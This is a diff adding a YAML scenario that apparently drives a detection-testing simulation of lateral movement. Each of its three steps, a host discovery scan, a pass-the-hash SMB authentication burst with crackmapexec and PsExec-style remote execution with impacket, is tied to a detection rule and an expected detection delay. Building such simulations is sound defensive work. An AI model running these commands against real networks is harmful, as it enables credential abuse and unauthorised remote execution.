@@ -1,0 +1,23 @@
+id: scn-int-lateral-movement
+name: Intermediate Lateral Movement
+difficulty: intermediate
+description: Simulates pass-the-hash style movement and remote execution.
+steps:
+  - id: step-host-discovery
+    name: Internal host discovery
+    tactic: Discovery
+    command: "nmap -sn 10.10.0.0/24"
+    detectionRuleId: det-network-host-scan
+    expectedDetectionDelaySec: 15
+  - id: step-remote-auth
+    name: Remote authentication burst
+    tactic: Lateral Movement
+    command: "crackmapexec smb 10.10.0.0/24 -u svc_backup -H deadbeefhash"
+    detectionRuleId: det-smb-auth-burst
+    expectedDetectionDelaySec: 21
+  - id: step-remote-exec
+    name: PsExec-style command execution
+    tactic: Execution
+    command: "impacket-psexec svc_backup@10.10.0.24 -hashes :deadbeefhash"
+    detectionRuleId: det-remote-service-exec
+    expectedDetectionDelaySec: 35
